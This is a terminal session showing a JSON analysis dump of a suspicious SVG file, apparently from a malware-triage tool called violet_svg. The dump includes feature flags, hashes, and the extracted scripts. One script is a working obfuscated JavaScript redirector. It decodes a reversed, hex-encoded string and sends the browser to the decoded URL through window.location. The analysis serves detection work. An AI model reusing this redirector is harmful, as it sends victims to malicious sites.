 `--`\==\- \   |==| ,|/=| _|==|  |\==\  `
      \==\_ \  |==|- `-' _ |==|- | \==\ -`
      |==|- |  |==|  _     |==| ,| _\==\ ,`
      |==|, |  |==|   .-. ,\==|- |/==/\/ _ |
      /==/ -/  /==/, //=/  /==/. /\==\ - , /
      `--`--`  `--`-' `-`--`--`-`  `--`---' 

     https://www.youtube.com/watch?v=jFKWVt8-9J0
      
coz@genesis:~/violet_svg$ cat datadump/dump.json | jq
{
  "has_script": true,
  "svg_metadata": {
    "width": "100%",
    "height": "100%",
    "viewBox": null,
    "preserveAspectRatio": null,
    "version": null,
    "baseProfile": null
  },
  "element_presence": {
    "structural": [
      "svg"
    ],
    "shapes": [],
    "descriptive": [],
    "text": [],
    "gradient_and_paint": [],
    "filter_and_masking": [],
    "animation": [],
    "other": [
      "foreignobject",
      "script"
    ],
    "unknown": [
      "body"
    ]
  },
  "element_counts": {
    "structural": {
      "svg": 1
    },
    "shapes": {},
    "descriptive": {},
    "text": {},
    "gradient_and_paint": {},
    "filter_and_masking": {},
    "animation": {},
    "other": {
      "foreignobject": 1,
      "script": 2
    },
    "unknown": {
      "body": 1
    }
  },
  "attribute_presence": {
    "core_global": [
      "xmlns"
    ],
    "events": [],
    "presentation": [
      "style"
    ],
    "coordinate_geometry": [
      "height",
      "width"
    ],
    "transform_coordinate": [],
    "text_specific": [],
    "linking": [],
    "animation": [],
    "filter_masking": [],
    "gradient_pattern": [],
    "conditional_processing": [],
    "unknown": [
      "src",
      "type"
    ]
  },
  "attribute_counts": {
    "core_global": {
      "xmlns": 2
    },
    "events": {},
    "presentation": {
      "style": 1
    },
    "coordinate_geometry": {
      "width": 2,
      "height": 2
    },
    "transform_coordinate": {},
    "text_specific": {},
    "linking": {},
    "animation": {},
    "filter_masking": {},
    "gradient_pattern": {},
    "conditional_processing": {},
    "unknown": {
      "type": 1,
      "src": 1
    }
  },
  "presence_hashes": {
    "element:structural:presence": "acdb1373d1761939cb5daa3332223298529581464a90afae39927e7aef8edd46",
    "element:shapes:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:descriptive:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:text:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:gradient_and_paint:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:presence": "45b0f315e9f956a526b58a27742cb9651aeb9a5a6a9383d6ad2d5e9528b6eb75",
    "element:unknown:presence": "230d8358dc8e8890b4c58deeb62912ee2f20357ae92a5cc861b98e68fe31acb5",
    "attribute:core_global:presence": "f4b32bbe56ec2e3233a0dcab6b3355534a5974539dd2226c98572434e0b3e5e7",
    "attribute:events:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:presence": "cb86eb2d914d37df6857c3cfe4827b5f770b01a86578120618b0b21572160be8",
    "attribute:coordinate_geometry:presence": "2f882eb6dfc0ddcc967cd9c268613d54dd56f2a1bdd56c147db4f3f1aa80ec4f",
    "attribute:transform_coordinate:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:text_specific:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:linking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:animation:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:filter_masking:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:presence": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:presence": "b0f8488044f56cb462189a6c9854d0abc12f7f0016b09db478974f694eca4544"
  },
  "count_hashes": {
    "element:structural:count": "add72a881b63e1ddc1ce72de20c6b031a4960fbfad2af9ac9b82358605034525",
    "element:shapes:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:descriptive:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:text:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:gradient_and_paint:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:filter_and_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:animation:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "element:other:count": "1b3fc165eca23bb5207dca8b3ad86075fbbd484b29829af9fae930082d53fb09",
    "element:unknown:count": "3ceffc8334ace10e20657015195255f6fc82749ff6295591e8aa6af93e32b756",
    "attribute:core_global:count": "ca9bfc032e5fbac04053b57c2b0202b7f8b9c39ccc7f25789ea2d346800d3838",
    "attribute:events:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:presentation:count": "d2310a5cff8efad684fb0ee6995709b2f2fb8a8c95550c776cdcf3584b2f6c53",
    "attribute:coordinate_geometry:count": "d9c89670247341e4ab4a45a091797d9b4e69f6c6746cc6faca37adc7c9d41e79",
    "attribute:transform_coordinate:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:text_specific:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:linking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:animation:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:filter_masking:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:gradient_pattern:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:conditional_processing:count": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "attribute:unknown:count": "991d01bdacbc6e3537df99c71d6a20c3bab531b02e1ddb4c944f6797c1046359"
  },
  "composite_hash": "73462f41b1b709d98b6e0c1b88e12c1bb9ad899039ba8424007f514cc037d811",
  "is_svg_wide": true,
  "found_invisible_chars": false,
  "normalized_content_length": 4162,
  "original_content_length": 4162,
  "invisible_flags_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "invisible_flags_unique": [],
  "invisible_flags_counts": {},
  "invisible_chars_total": 0,
  "only_script": false,
  "has_fullscreen_foreignobject": true,
  "has_iframe_in_foreignobject": false,
  "has_base64_dataurl_script_src": true,
  "script_features": {
    "http_base64_in_script": false,
    "eval": false,
    "preventdefault": false,
    "fromcharcode": true,
    "charcodeat": false,
    "replace": true,
    "concat": false,
    "long_hex_string": false,
    "long_b64_string": false,
    "two_for_one_match": false,
    "split": true,
    "atob": false,
    "btoa": false,
    "unescape": false,
    "escape": false,
    "decodeuri": false,
    "encodeuri": false,
    "decodeuricomponent": false,
    "encodeuricomponent": false,
    "document_write": false,
    "document_writeln": false,
    "document_open": false,
    "document_createelement": false,
    "window_location": true,
    "contextmenu": false,
    "ctrlkey": false,
    "shiftkey": false,
    "altkey": false,
    "metakey": false,
    "keycode": false,
    "magic85": false,
    "magic123": false,
    "magic73": false,
    "magic74": false,
    "join": true,
    "map": true,
    "filter": false,
    "reduce": false,
    "slice": false,
    "domcontentloaded": false,
    "createelementns": false,
    "blob": false,
    "click": false,
    "appendchild": false,
    "createobjecturl": false,
    "revokeobjecturl": false,
    "insertbefore": false,
    "removechild": false,
    "addeventlistener": false,
    "clipboardwritetext": false
  },
  "security_composite_hash": "6b1a92c9a6fc6fba84fc4bb3136f1b0970d5c368ce299fe315616796664c7f70",
  "security_composite_hash_dimensions": "a9f7b253652cddef83cc2e401dc401f6f0c303f998d6659ba9f9c523cfe71597",
  "security_composite_hash_script_features_v1": "1d7c5a45c5b451cf6679111cd4a5668381acb3df8a96541d6eef42723707aedc",
  "extracted_data": {
    "urls": [],
    "scripts": [
      "\n                    <!--  The child painted a curious thought while sailing across the seas.  -->\n                    merimo = '';\n                ",
      "try {\n    function duruwo(str) {\n        try {\n            let cibeme = str.split(\"\").reverse().join(\"\");\n            let kariye = cibeme.replace(/[xqzmv]/g, \"\");\n            let pakete = kariye.split(\"-\").map(hex => String.fromCharCode((parseInt(hex, 16) - 7) / 3)).join(\"\");\n            return pakete;\n        } catch (e) {\n            console.error(\"Decoding error:\", e);\n            return null;\n        }\n    }\n    const xipusa = \"e41-451-031-19-c61-451-331-151-241-c61-151-451-241-361-031-631-b41-931-631-d51-7c-631-b41-d21-a21-271-a21-751-061-361-151-661-451-031-031-a21-49-2b-361-a21-af-f61-be-301-511-cd-a21-061-271-331-c31-751-751-d21-571-6a-1f-b41-ac-0a-af-211-c01-151-fa-6d-d21-a21-6a-d51-9d-df-631-a21-4f-79-631-9d-601-7f-961-df-c01-f61-a51-2b-3d-001-271-661-451-9a-fa-b41-dc-151-fd-f61-6d-031-9a-601-601-961-2b-301-d9-a9-301-4f-6d-9d-dc-601-dc-f01-061-be-af-8e-5e-031-571-151-9d-fa-4f-451-001-2b-841-271-2e-901-241-0d-79-001-2b-541-901-f61-901-f61-9d-9d-841-2e-2e-c31-151-511-751-d51-901-061-fa-9a-f01-301-451-3a-d21-271-3d-5e-79-af-6a-3a-511-79-fa-361-2b-c31-751-571-511-af-1f-661-1f-901-961-fa-1f-0d-dc-001-ee-151-961-3a-e41-601-ac-451-fa-ac-be-301-cd-241-df-ca-751-4f-7f-c01-d9-0d-751-061-931-271-d9-6d-0a-3d-6d-9a-d51-571-361-1f-3a-751-2b-2e-451-541-241-571-a21-6d-9d-49-ca-3d-841-c61-e41-79-571-2e-751-211-a9-1f-3d-ac-001-211-0d-271-9d-0a-3d-d51-f61-841-2e-601-4f-d21-961-be-961-6a-571-b41-0d-3d-f31-d9-2e-0d-5e-631-031-d51-2e-541-be-c61-f01-271-fd-451-4f-e41-a51-541-9a-601-ee-841-541-f01-961-9a-961-be-061-901-301-ca-9a-df-841-931-dc-b41-9d-541-6a-241-d51-9a-a21-361-511-571-c01-031-331-fd-061-a21-3d-1f-d9-841-451-901-331-9a-ac-df-6a-901-ca-c01-061-a51-361-df-dc-5e-c31-2e-901-f31-031-211-511-d51-f01-d9-331-be-031-f61-f61-af-c31-a21-661-151-931-6d-5e-9d-d21-a9-c61-d51-751-dc-1f-fa-8e-031-d9-271-3a-661-c61-211-541-d51-79-d51-d9-511-571-0a-fd-061-301-4f-f31-ee-c01-b41-9a-6d-6a-8e-b41-511-dc-c31-631-541-7f-af-ca-8e-ee-001-d9-d9-931-dc-ca-79-d9-301-211-631-271-d9-79-931-1f-241-49-331-931-031-19-451-241-331-a21-d51-931-451-451-c61-19-151-061-931-ee-be-151-ca-f61-b41-661-49-49-5b-751-361-361-f31\";\n    const pecolo = duruwo(xipusa);\n    if (pecolo) {\n        window.location.href = pecolo + merimo;\n    }\n    const vihecu = document.getElementById(\"sahice\");\n    if (vihecu) {\n        vihecu.href = pecolo;\n        vihecu.style.display = \"block\";\n    }\n    } catch (e) {\n        console.error(\"Error in execution:\", e);\n    }"
    ],
    "text": []
  },
  "data_urls": [
    {
      "claimed_mime": "application/ecmascript",
      "actual_mime": "text/plain",
      "is_base64": true,
      "file_path": "datadump/b11f005ac6f06d9e89ef9ed3493daae6ce6ef8d71971579bcd7827844e9747c8.bin",
      "sha1": "cffe0544b7a84dc27313bb06b4e0960928954c99",
      "sha256": "b11f005ac6f06d9e89ef9ed3493daae6ce6ef8d71971579bcd7827844e9747c8",
      "size": 2449
    }
  ]
}
coz@genesis:~/violet_svg$ 


```
